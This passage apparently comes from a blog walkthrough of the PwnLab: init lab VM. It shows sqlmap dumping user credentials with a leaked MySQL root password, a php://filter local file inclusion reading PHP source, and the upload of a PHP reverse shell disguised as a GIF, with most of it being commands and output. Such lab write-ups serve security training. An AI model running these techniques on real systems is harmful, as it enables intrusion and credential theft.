<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="s1">&#39;mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users&#39;</span> --dump -T users -D Users
</span><span class='line'>         _
</span><span class='line'> ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
</span><span class='line'><span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
</span><span class='line'><span class="s1">      |_|           |_|   http://sqlmap.org</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> starting at 20:03:23
</span><span class='line'>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="s1">&#39;users&#39;</span> in database <span class="s1">&#39;Users&#39;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;user&#39;</span>, u<span class="s1">&#39;varchar(30)&#39;</span><span class="o">]</span>, <span class="o">[</span>u<span class="s1">&#39;pass&#39;</span>, u<span class="s1">&#39;varchar(30)&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching entries <span class="k">for</span> table <span class="s1">&#39;users&#39;</span> in database <span class="s1">&#39;Users&#39;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> analyzing table dump <span class="k">for</span> possible password hashes
</span><span class='line'>Database: Users
</span><span class='line'>Table: users
</span><span class='line'><span class="o">[</span><span class="m">3</span> entries<span class="o">]</span>
</span><span class='line'>+------------------+--------+
</span><span class='line'><span class="p">|</span> pass             <span class="p">|</span> user   <span class="p">|</span>
</span><span class='line'>+------------------+--------+
</span><span class='line'><span class="p">|</span> <span class="nv">aVN2NVltMkdSbw</span><span class="o">==</span> <span class="p">|</span> kane   <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="nv">Sld6WHVCSkpOeQ</span><span class="o">==</span> <span class="p">|</span> kent   <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="nv">U0lmZHNURW42SQ</span><span class="o">==</span> <span class="p">|</span> mike   <span class="p">|</span>
</span><span class='line'>+------------------+--------+
</span><span class='line'>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> table <span class="s1">&#39;Users.users&#39;</span> dumped to CSV file <span class="s1">&#39;/root/.sqlmap/output/10.1.1.140/dump/Users/users.csv&#39;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 20:03:24
</span></code></pre></td></tr></table></div></figure>


<p>Cool, here we go, got the username and password (base64 encoded), and the user/pass are:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane / iSv5Ym2GRo
</span><span class='line'>kent / JWzXuBJJNy
</span><span class='line'>mike / SIfdsTEn6I
</span></code></pre></td></tr></table></div></figure>


<p>I also checked if I can write file via MySQL, but sounds like we don&rsquo;t have enough privilege.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="s1">&#39;mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users&#39;</span> --current-user --is-dba
</span><span class='line'>         _
</span><span class='line'> ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
</span><span class='line'><span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
</span><span class='line'><span class="s1">      |_|           |_|   http://sqlmap.org</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> starting at 22:37:40
</span><span class='line'>
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current user
</span><span class='line'>current user:    <span class="s1">&#39;root@%&#39;</span>
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> current user is DBA
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current user
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1142, <span class="s2">&quot;SELECT command denied to user &#39;root&#39;@&#39;10.1.1.132&#39; for table &#39;user&#39;&quot;</span><span class="o">)</span>
</span><span class='line'>current user is DBA:    False
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 22:37:40
</span></code></pre></td></tr></table></div></figure>


<p>Due to the current user is not DBA, I could not write file via MySQL ROOT account.</p>

<p>After login as user <code>kane</code>, I&rsquo;m trying to upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">php reverse shell</a>, but the web application only accept image files.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pwnlab_init/1.png"></p>

<p>In order to bypass the file extention limit, I downloaded the file <code>upload.php</code> by using the previouse LFI exploition method.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>upload
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmlmICghaXNzZXQoJF9TRVNTSU9OWyd1c2VyJ10pKSB7IGRpZSgnWW91IG11c3QgYmUgbG9nIGluLicpOyB9DQo/Pg0KPGh0bWw+DQoJPGJvZHk+DQoJCTxmb3JtIGFjdGlvbj0nJyBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCQkJPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2ZpbGUnIGlkPSdmaWxlJyAvPg0KCQkJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJy8+DQoJCTwvZm9ybT4NCgk8L2JvZHk+DQo8L2h0bWw+DQo8P3BocCANCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7DQoJaWYgKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA8PSAwKSB7DQoJCSRmaWxlbmFtZSAgPSAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsNCgkJJGZpbGV0eXBlICA9ICRfRklMRVNbJ2ZpbGUnXVsndHlwZSddOw0KCQkkdXBsb2FkZGlyID0gJ3VwbG9hZC8nOw0KCQkkZmlsZV9leHQgID0gc3RycmNocigkZmlsZW5hbWUsICcuJyk7DQoJCSRpbWFnZWluZm8gPSBnZXRpbWFnZXNpemUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddKTsNCgkJJHdoaXRlbGlzdCA9IGFycmF5KCIuanBnIiwiLmpwZWciLCIuZ2lmIiwiLnBuZyIpOyANCg0KCQlpZiAoIShpbl9hcnJheSgkZmlsZV9leHQsICR3aGl0ZWxpc3QpKSkgew0KCQkJZGllKCdOb3QgYWxsb3dlZCBleHRlbnNpb24sIHBsZWFzZSB1cGxvYWQgaW1hZ2VzIG9ubHkuJyk7DQoJCX0NCg0KCQlpZihzdHJwb3MoJGZpbGV0eXBlLCdpbWFnZScpID09PSBmYWxzZSkgew0KCQkJZGllKCdFcnJvciAwMDEnKTsNCgkJfQ0KDQoJCWlmKCRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvZ2lmJyAmJiAkaW1hZ2VpbmZvWydtaW1lJ10gIT0gJ2ltYWdlL2pwZWcnICYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvanBnJyYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvcG5nJykgew0KCQkJZGllKCdFcnJvciAwMDInKTsNCgkJfQ0KDQoJCWlmKHN1YnN0cl9jb3VudCgkZmlsZXR5cGUsICcvJyk+MSl7DQoJCQlkaWUoJ0Vycm9yIDAwMycpOw0KCQl9DQoNCgkJJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyIC4gbWQ1KGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkuJGZpbGVfZXh0Ow0KDQoJCWlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdXBsb2FkZmlsZSkpIHsNCgkJCWVjaG8gIjxpbWcgc3JjPVwiIi4kdXBsb2FkZmlsZS4iXCI+PGJyIC8+IjsNCgkJfSBlbHNlIHsNCgkJCWRpZSgnRXJyb3IgNCcpOw0KCQl9DQoJfQ0KfQ0KDQo/Pg<span class="o">==</span>&lt;/center&gt;
</span><span class='line'>&lt;/body&gt;
</span></code></pre></td></tr></table></div></figure>


<p>After decoded the base64 code, I got the following <code>upload.php</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;?php
</span><span class='line'>session_start<span class="o">()</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;user&#39;</span><span class="o">]))</span> <span class="o">{</span> die<span class="o">(</span><span class="s1">&#39;You must be log in.&#39;</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>  &lt;body&gt;
</span><span class='line'>      &lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">&#39;&#39;</span> <span class="nv">method</span><span class="o">=</span><span class="s1">&#39;post&#39;</span> <span class="nv">enctype</span><span class="o">=</span><span class="s1">&#39;multipart/form-data&#39;</span>&gt;
</span><span class='line'>          &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> /&gt;
</span><span class='line'>          &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">value</span><span class="o">=</span><span class="s1">&#39;Upload&#39;</span>/&gt;
</span><span class='line'>      &lt;/form&gt;
</span><span class='line'>  &lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'>&lt;?php
</span><span class='line'><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;submit&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;error&#39;</span><span class="o">]</span> &lt;<span class="o">=</span> 0<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>      <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;type&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$file_ext</span>  <span class="o">=</span> strrchr<span class="o">(</span><span class="nv">$filename</span>, <span class="s1">&#39;.&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$imageinfo</span> <span class="o">=</span> getimagesize<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$whitelist</span> <span class="o">=</span> array<span class="o">(</span><span class="s2">&quot;.jpg&quot;</span>,<span class="s2">&quot;.jpeg&quot;</span>,<span class="s2">&quot;.gif&quot;</span>,<span class="s2">&quot;.png&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="o">(</span>!<span class="o">(</span>in_array<span class="o">(</span><span class="nv">$file_ext</span>, <span class="nv">$whitelist</span><span class="o">)))</span> <span class="o">{</span>
</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$filetype</span>,<span class="s1">&#39;image&#39;</span><span class="o">)</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Error 001&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="o">(</span><span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/png&#39;</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Error 002&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="o">(</span>substr_count<span class="o">(</span><span class="nv">$filetype</span>, <span class="s1">&#39;/&#39;</span><span class="o">)</span>&gt;1<span class="o">){</span>
</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Error 003&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> . md5<span class="o">(</span>basename<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">]))</span>.<span class="nv">$file_ext</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="o">]</span>, <span class="nv">$uploadfile</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>          <span class="nb">echo</span> <span class="s2">&quot;&lt;img src=\&quot;&quot;</span>.<span class="nv">$uploadfile</span>.<span class="s2">&quot;\&quot;&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Error 4&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>?&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Here, this <code>***.gif</code> file is the php reverse shell.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pwnlab_init/2.png"></p>

<p>Now the evil php has been uploaded and I have to find a way to trigger it. So I download the <code>index.php</code> to have a check.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4<span class="o">=</span>&lt;/center&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;?php
</span><span class='line'>//Multilingual. Not implemented yet.
</span><span class='line'>//setcookie<span class="o">(</span><span class="s2">&quot;lang&quot;</span>,<span class="s2">&quot;en.lang.php&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">&#39;lang&#39;</span><span class="o">]))</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  include<span class="o">(</span><span class="s2">&quot;lang/&quot;</span>.<span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">&#39;lang&#39;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>// Not implemented yet.
</span><span class='line'>?&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
